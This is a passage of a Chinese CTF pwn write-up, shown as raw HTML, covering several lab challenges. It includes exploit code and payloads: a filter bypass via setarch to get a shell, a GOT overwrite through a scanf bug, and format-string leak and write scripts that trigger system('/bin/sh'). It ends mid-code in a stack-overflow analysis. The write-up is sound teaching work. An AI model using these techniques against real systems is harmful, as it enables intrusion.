class="number">17728</span>,<span class="number">15991</span>,<span class="number">12642</span>,<span class="number">16253</span>,<span class="number">13690</span>,<span class="number">15605</span>,<span class="number">12190</span>,<span class="number">16874</span>,<span class="number">18648</span>,<span class="number">10083</span>,<span class="number">18252</span>,<span class="number">14345</span>,<span class="number">11875</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">    send_secret(i)</span><br><span class="line"></span><br><span class="line">send_secret(<span class="number">66666</span>)</span><br></pre></td></tr></table></figure></div><p>只用找出前0x10个secret即可，不过，硬要找全10000也不难，正则匹配一下就好 。</p><h2 id="Test-your-ssh-test-TaQini"><a href="#Test-your-ssh-test-TaQini" class="headerlink" title="Test your ssh(test) - TaQini"></a>Test your ssh(test) - TaQini</h2><blockquote><p>由于Ubuntu 14之后，通过egid执行/bin/sh的权限被ban了<br>所以这次比赛ssh靶机用的全是Ubuntu 14.04</p></blockquote><p>考察点：linux基础</p><p>这题设置的目的是测试ssh连接显示编码什么的是否正常，但是直接白给不太好，就加了个字符过滤。</p><p>看源码，可知过滤了以下字符：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> n e p b u s h i f l a g | / $ ` - &lt; &gt; .</span><br></pre></td></tr></table></figure></div><p>于是就找可用的命令呗，先看下环境变量<code>PATH</code>，然后<code>grep</code>搜一下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> env <span class="variable">$PATH</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls /usr/<span class="built_in">local</span>/sbin /usr/<span class="built_in">local</span>/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/<span class="built_in">local</span>/games | grep -v -E <span class="string">'n|e|p|b|u|s|h|i|f|l|a|g'</span></span></span><br></pre></td></tr></table></figure></div><p>发现<code>od</code>幸存</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf@f930cab87217:~$ .&#x2F;test | grep 045102 -C 2</span><br><span class="line">od *</span><br><span class="line">uid&#x3D;1000(ctf) gid&#x3D;1000(ctf) egid&#x3D;1001(ctf_pwn) groups&#x3D;1000(ctf)</span><br><span class="line">0000000 045102 075504 067145 067552 057571 067571 071165 070137</span><br><span class="line">0000020 067167 063537 066541 076545 077412 046105 001106 000401</span><br><span class="line">0000040 000000 000000 000000 000000 001000 037000 000400 000000</span><br></pre></td></tr></table></figure></div><p>使用<code>od</code>输出flag，然后解八进制即可</p><p><strong>非预期解</strong></p><p><code>x86_64</code>命令没有过滤掉，可以直接拿shell</p><p>原理如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /usr/bin/x86_64</span><br><span class="line">lrwxrwxrwx 1 root root 7 8月  23  2019 /usr/bin/x86_64 -&gt; setarch</span><br></pre></td></tr></table></figure></div><p><code>x86_64</code>是指向<code>setarch</code>命令(soft link)，查看一下<code>setarch</code>的文档，如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setarch - change reported architecture in new program environment and/or set personality flags </span><br><span class="line">...</span><br><span class="line">The default program is /bin/sh.</span><br></pre></td></tr></table></figure></div><h2 id="挑食的小蛇-snake-TaQini"><a href="#挑食的小蛇-snake-TaQini" class="headerlink" title="挑食的小蛇(snake) - TaQini"></a>挑食的小蛇(snake) - TaQini</h2><p>考察点：字符串截断 or 耐心</p><blockquote><p>背景知识：c语言中字符串以’\x00’为结尾</p></blockquote><p>把程序下载下来，调试，发现<code>Name</code>和<code>flag</code>相邻，相差0x100字节</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p &amp;Name</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = (&lt;data variable, no debug info&gt; *) 0x5555555592e0 &lt;Name&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p &amp;flag</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = (&lt;data variable, no debug info&gt; *) 0x5555555593e0 &lt;flag&gt;</span></span><br></pre></td></tr></table></figure></div><p>查看源码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入玩家昵称(仅限英文)[按回车开始游戏]:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">strncpy</span>(Name, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输入昵称时会copy 0x100个字节到<code>Name</code>，所以只要输入长度为0x100的昵称，<code>Name</code>的结尾就不会有’\x00’，游戏显示玩家昵称时就会把<code>Name</code>和<code>flag</code>一起打印出来。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 正常情况</span></span><br><span class="line">Name: 'TaQini\x00'</span><br><span class="line">flag: 'flag&#123;xxxx&#125;\x00'</span><br><span class="line"><span class="meta">#</span><span class="bash"> 非正常情况</span></span><br><span class="line">Name: 'TaQini.......flag\x00'</span><br></pre></td></tr></table></figure></div><p>p.s.这题玩到3000分也可解，比赛时好多师傅硬怼出来的……嗯….耐心也是一名pwn手的基本素养</p><h2 id="贪吃的小蛇-snake2-TaQini"><a href="#贪吃的小蛇-snake2-TaQini" class="headerlink" title="贪吃的小蛇(snake2) - TaQini"></a>贪吃的小蛇(snake2) - TaQini</h2><p>考察点：<code>scanf</code></p><blockquote><p>这题的设计参考pwnable.kr的passcode<br>题解详见:<a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">https://blog.csdn.net/smalosnail/article/details/53247502</a><br>文章题目: scanf忘记加’&amp;’危害有多大？详解GOT表覆写攻击技术</p></blockquote><p>拿到代码后找不同，看看那里和<code>snake1</code>不一样</p><ol><li><p>获胜分数提高了，硬玩儿是玩儿不出来的</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"  控制Imagin吃豆豆，达到300000分\n"</span>);</span><br></pre></td></tr></table></figure></div></li><li><p><code>getName</code>读昵称的长度变短了，不能利用<code>snake1</code>的解法</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入玩家昵称(仅限英文)[按回车开始游戏]:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">strncpy</span>(Name, buf, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>多了一个调查问卷功能</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">questionnaire</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Goal;</span><br><span class="line">    <span class="keyword">char</span> Answer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"你收到了一份来自TaQini的调查问卷"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1.Snake系列游戏中，贪吃蛇的名字是:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%20s"</span>,Answer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2.Pwn/Game真好玩儿[Y/n]:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%20s"</span>,Answer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"3.你目标的分数是:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,Goal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>通过<strong>对比</strong>可知，<code>snake1</code>的漏洞点在<code>getName</code>，<code>snake2</code>的漏洞点在<code>questionnaire</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GameRun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> GameState=<span class="number">1</span>;</span><br><span class="line">    score=<span class="number">0</span>;</span><br><span class="line">    Level=<span class="number">1</span>;</span><br><span class="line">    printRule();</span><br><span class="line">    getName();</span><br><span class="line">    questionnaire();</span><br><span class="line">    PSnake jack=Init();</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>查看<code>questionnaire</code>的上一层函数，可见<code>getName</code>和<code>questionnaire</code>用是<strong>同一片栈空间</strong></p><p>按照<a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">参考文章</a>中的做法，利用<code>scanf</code>覆写got表为后门<code>system(&quot;/bin/sh&quot;)</code>的地址，即可getshell</p><p>比如，后续的<code>Init</code>函数中调用了<code>malloc</code>，因此可以覆写<code>malloc</code>的got表：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSnake head=(PSnake)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br></pre></td></tr></table></figure></div><p>这题<code>malloc</code>的got表地址<code>0x405078</code>都是可见字符，解题时甚至不用写脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = 'a'*220+'xP@' # xP@ &lt;- (malloc.got)</span><br><span class="line">goal = 4201717 # &lt;- backdoor</span><br></pre></td></tr></table></figure></div><h2 id="鹅螺狮的方块-els-TaQini"><a href="#鹅螺狮的方块-els-TaQini" class="headerlink" title="鹅螺狮的方块(els) - TaQini"></a>鹅螺狮的方块(els) - TaQini</h2><p>考察点：格式化字符串</p><p>打开游戏，发现底部有个留言板十分瞩目，找到对应源码，发现存在格式化字符串漏洞：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* 实时显示留言 */</span></span><br><span class="line">    fmsg = fopen(<span class="string">"./msg"</span>,<span class="string">"r+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == fmsg) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fread(message,<span class="number">0x80</span>,<span class="number">1</span>,fmsg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"\033[22;1H留言:"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,message);</span><br></pre></td></tr></table></figure></div><p>那么本题的主要漏洞就是他了。</p><p>知己知彼，百战不殆。要想pwn掉els，需要先对程序了解个大概。于是浏览源码：</p><ol><li>程序开头读取本地record文件，加载变量最高记录，随后判断最高分数，大于阈值就给shell <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读取文件的最高记录 */</span></span><br><span class="line">fp = fopen(<span class="string">"./record"</span>,<span class="string">"r+"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 文件不存在则创建并打开</span></span><br><span class="line"><span class="comment">     * "w"方式打开会自动创建不存在的文</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fp = fopen(<span class="string">"./record"</span>,<span class="string">"w"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%u"</span>,&amp;maxScore);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(maxScore &gt; <span class="number">666666</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"干的漂亮！奖励鹅罗狮高手shell一个！"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>实时显示留言功能：读取msg文件，打印留言，其中<code>fprintf(stdout,message)</code>存在漏洞 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 实时显示留言 */</span></span><br><span class="line">fmsg = fopen(<span class="string">"./msg"</span>,<span class="string">"r+"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fmsg) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> message[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fread(message,<span class="number">0x80</span>,<span class="number">1</span>,fmsg);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"\033[22;1H留言:"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,message);</span><br></pre></td></tr></table></figure></div></li><li>消除方块功能：更新最高分数，将最高分写入record文件 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkDeleteLine</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* 记录最高分 */</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt; maxScore)</span><br><span class="line">    &#123;</span><br><span class="line">        maxScore = score;</span><br><span class="line">        <span class="comment">/* 保存最高分 */</span></span><br><span class="line">        rewind(fp);</span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"%u\n"</span>,maxScore);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div></li></ol><p>鲁迅曾经说过：</p><blockquote><p>一切皆文件</p></blockquote><p>所以上述代码的浏览主要以<code>msg</code>和<code>record</code>这两个文件为线索。</p><p>现在思路就很明朗了，通过格式化字符串漏洞修改<code>maxScore</code>，消除一行方块，触发历史记录更新，改写<code>record</code>文件，重新开始游戏，getshell。</p><blockquote><p>关于文件权限，可以通过<code>ls -al</code> 查看：<br><code>msg</code>可读可写，<code>record</code>可读，只有运行els程序时可写</p></blockquote><p>由于开了地址随机化，<code>maxScore</code>的地址不固定，但是这在格式化字符串漏洞面前都不是事儿，先泄漏，再改写即可。exp如下：</p><p><code>leak.py</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">payload = <span class="string">"%73$p"</span></span><br><span class="line">f = open(<span class="string">'/home/ctf/msg'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></div><p><code>exp.py</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">start = eval(argv[<span class="number">1</span>])</span><br><span class="line">score = start<span class="number">-0x1180</span>+<span class="number">0x53ac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(666666) = 0xa2c2a</span></span><br><span class="line">payload = <span class="string">"%20c%8$n"</span> + pack(<span class="string">'&lt;Q'</span>, score+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> hex(score)</span><br><span class="line">f = open(<span class="string">'/home/ctf/msg'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></div><p>上述两个文件放到<code>/tmp</code>目录下，先执行leak拿到程序基址，再通过exp计算<code>maxScore</code>地址并改写。消除一行方块后触发记录更新，游戏结束后<code>maxScore</code>写入文件，再次打开游戏即可getshell。</p><h2 id="营救Imagin-rci-TaQini"><a href="#营救Imagin-rci-TaQini" class="headerlink" title="营救Imagin(rci) - TaQini"></a>营救Imagin(rci) - TaQini</h2><p>考察点：linux基础，ls命令</p><blockquote><p>本题的设计源于HGame2020 - findyourself<br>题解链接：<a href="http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#findyourself">http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#findyourself</a></p></blockquote><p><a href="http://image.taqini.space/img/F4615175823EF6117CE409EBD447CC40.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/F4615175823EF6117CE409EBD447CC40.jpg" src="/img/loading.gif" class="lazyload"></a></p><p>背景就不多介绍了，imagin被关进了随机创建的48个房间之一，这时有一次执行系统命令的机会，经过层层过滤，只有ls命令可用，使用ls获取一些线索后，就要输入imagin所在的正确房间号了，答对后获得第二次执行系统命令的机会，可以getshell。</p><p>在hgame-fys中第一次命令执行是通过 <code>ls -l /proc/self/cwd</code> 获取的当前目录，而本题没有给<code>/proc</code>，所以要另辟蹊径，也就是本题的考察点<code>inode</code>了。</p><p><code>inode</code> 是linux用于文件储存的<strong>索引节点</strong>，操作系统大家应该都学过：</p><blockquote><p>系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。<br><strong>文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode</strong><br><em>摘自：</em><a href="https://blog.csdn.net/xuz0917/article/details/79473562" target="_blank" rel="noopener">https://blog.csdn.net/xuz0917/article/details/79473562</a></p></blockquote><p>也就是说<code>inode</code>和文件是<strong>一一对应</strong>的，鲁迅曾经说过：</p><blockquote><p>一切皆文件</p></blockquote><p>目录也是文件，也有他对应的inode，于是，本题的重点来了——<strong>ls命令常用参数（敲黑板）</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l  # 以列表格式显示</span><br><span class="line">ls -a  # 不隐藏以.开头的文件</span><br><span class="line">ls -i  # 显示文件inode</span><br></pre></td></tr></table></figure></div><p>众所周知，当前目录文件用 <code>.</code> 表示，所以输入 <code>ls -ali</code> 命令即可显示当前目录的<code>inode</code>号<br>也就是说，imagin所在房间的<code>inode</code>已知了，但是 <code>.</code> 是<strong>相对路径</strong>，题目中要求验证<strong>绝对路径</strong></p><p>于是想办法查看绝对路径，我们已知房间是在/tmp目录下的，所以不难想到，再开一个shell，输入 <code>ls -ali /tmp</code> 显示/tmp目录下所有文件<code>inode</code>，根据唯一的<code>inode</code>找到对应房间号，即可通过check1。</p><p>本题重点结束。</p><p>check2 也过滤了一些字符，可以通过输入 <code>$0</code> 绕过。</p><h2 id="我们不一样-diff-TaQini"><a href="#我们不一样-diff-TaQini" class="headerlink" title="我们不一样(diff) - TaQini"></a>我们不一样(diff) - TaQini</h2><p>考察点：栈溢出</p><blockquote><p>题目是汇编写的，所以就没给源码，做题时需要把文件下载到本地分析。<br>下载方法挺多的，这里说两种比较直接的方法：</p><ol><li><code>base64</code>编码后复制粘贴到本地  </li><li><code>scp</code> 命令 使用ssh协议传输文件</li></ol></blockquote><p>用过<code>diff</code>命令的师傅不难看出，这题是一个缩减版的<code>diff</code>命令，功能是比较两个文件，输出两文件内容不相同的那一行的行号。分析程序，打开文件部分没得说，直接看比较函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> addr[<span class="number">120</span>]; <span class="comment">// [esp+8h] [ebp-78h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  JUMPOUT(sys_read(fd, buf1, <span class="number">0x80</span>u), <span class="number">0</span>, &amp;failed);</span><br><span class="line">  JUMPOUT(sys_read(a1, addr, <span class="number">0x80</span>u), <span class="number">0</span>, &amp;failed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; addr[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v2 != addr[i] )</span><br><span class="line">      <span class="keyword">return</span> v4 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</span><br><span class="line">      ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 